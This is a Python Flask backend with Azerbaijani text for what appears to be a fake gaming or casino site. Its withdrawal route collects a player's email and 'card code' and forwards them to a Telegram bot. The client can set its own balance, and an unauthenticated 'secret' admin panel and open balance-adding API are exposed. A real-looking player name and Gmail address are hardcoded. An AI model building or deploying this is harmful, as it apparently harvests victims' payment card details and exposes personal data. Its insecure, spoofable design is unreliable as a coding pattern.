import os
import time
import requests
from flask import Flask, render_template, request, jsonify, abort
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

# --- TELEGRAM BOT MƏLUMATLARI ---
TELEGRAM_BOT_TOKEN = "BURAYA_BOT_TOKEN_YAZIN"
TELEGRAM_CHAT_ID = "BURAYA_CHAT_ID_YAZIN"

def send_telegram_notification(message):
    if TELEGRAM_BOT_TOKEN == "BURAYA_BOT_TOKEN_YAZIN":
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram xətası:", e)

# --- RATE LIMITING ---
REQUEST_COUNTS = {}
RATE_LIMIT_WINDOW = 1
MAX_REQUESTS_PER_SECOND = 20

def security_shield(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        current_time = time.time()
        
        if ip not in REQUEST_COUNTS:
            REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
        else:
            data = REQUEST_COUNTS[ip]
            if current_time - data['start_time'] < RATE_LIMIT_WINDOW:
                data['count'] += 1
                if data['count'] > MAX_REQUESTS_PER_SECOND:
                    abort(429, description="Çoxlu sayda sorğu göndərildi.")
            else:
                REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
                
        return f(*args, **kwargs)
    return decorated_function

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

# Oyunçu bazası
players_db = {
    "HOT_1106": {
        "id": "HOT_1106",
        "name": "Alexs Aliyev",
        "email": "aliyevalexs23@gmail.com",
        "status": "Onlayn (Aktiv)",
        "last_seen": "15:00:12",
        "balance": 160.39,
        "total_deposit": 250.00
    }
}

@app.route('/')
@security_shield
def home():
    return render_template('index.html')

@app.route('/admin')
@security_shield
def admin_panel():
    return render_template('gizli_panel.html', players=players_db.values())

@app.route('/api/get_players', methods=['GET'])
@security_shield
def get_players():
    return jsonify(list(players_db.values()))

@app.route('/api/add_balance', methods=['POST'])
@security_shield
def add_balance():
    data = request.json
    if not data:
        return jsonify({"success": False, "message": "Etibarsız məlumat!"}), 400
        
    player_id = data.get('player_id')
    amount = data.get('amount')
    
    if player_id in players_db:
        try:
            val = float(amount)
            if val <= 0:
                return jsonify({"success": False, "message": "Məbləğ sıfırdan böyük olmalıdır!"}), 400
            players_db[player_id]['balance'] += val
            players_db[player_id]['total_deposit'] += val
            return jsonify({"success": True, "message": f"Balansa və ümumi depozitə {val:.2f} ₼ əlavə edildi!"})
        except (ValueError, TypeError):
            return jsonify({"success": False, "message": "Yanlış məbləğ formatı!"}), 400
            
    return jsonify({"success": False, "message": "Oyunçu tapılmadı!"}), 404

@app.route('/login', methods=['POST'])
@security_shield
def login():
    data = request.json or {}
    player_id = data.get('playerId')
    gmail = data.get('gmail')
    
    if player_id in players_db and players_db[player_id]['email'] == gmail:
        players_db[player_id]['status'] = "Onlayn (Aktiv)"
        players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
        return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
    return jsonify({"status": "error", "message": "Tapılmadı"})

@app.route('/auth', methods=['POST'])
@security_shield
def auth():
    data = request.json or {}
    name = data.get('name', 'Qonaq')
    email = data.get('gmail', 'qonaq@gmail.com')
    
    # Əgər bu gmail artıq bazadadırsa, həmin istifadəçini qaytar
    for pid, pdata in players_db.items():
        if pdata['email'] == email:
            return jsonify({"status": "success", "playerId": pid, "balance": pdata['balance']})
            
    new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
    players_db[new_id] = {
        "id": new_id, "name": name, "email": email,
        "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 10.00, "total_deposit": 10.00
    }
    return jsonify({"status": "success", "playerId": new_id, "balance": 10.00})

@app.route('/update_balance', methods=['POST'])
@security_shield
def update_balance():
    data = request.json or {}
    player_id = data.get('playerId')
    new_balance = data.get('balance')
    if player_id in players_db and new_balance is not None:
        try:
            players_db[player_id]['balance'] = float(new_balance)
            players_db[player_id]['status'] = "Onlayn (Aktiv)"
            players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
            return jsonify({"status": "success"})
        except ValueError:
            pass
    return jsonify({"status": "error"})

@app.route('/withdraw', methods=['POST'])
@security_shield
def withdraw():
    data = request.json or {}
    player_id = data.get('playerId')
    amount = data.get('amount')
    gmail = data.get('gmail', 'Qeyd olunmayıb')
    card_code = data.get('cardCode', 'Qeyd olunmayıb')
    
    try:
        amount = float(amount)
    except (ValueError, TypeError):
        return jsonify({"status": "error", "message": "Yanlış məbləğ"})
        
    if player_id in players_db and players_db[player_id]['balance'] >= amount:
        players_db[player_id]['balance'] -= amount
        
        msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
        send_telegram_notification(msg)
        
        return jsonify({"status": "success"})
        
    return jsonify({"status": "error", "message": "Balans kifayət etmir və ya oyunçu tapılmadı"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)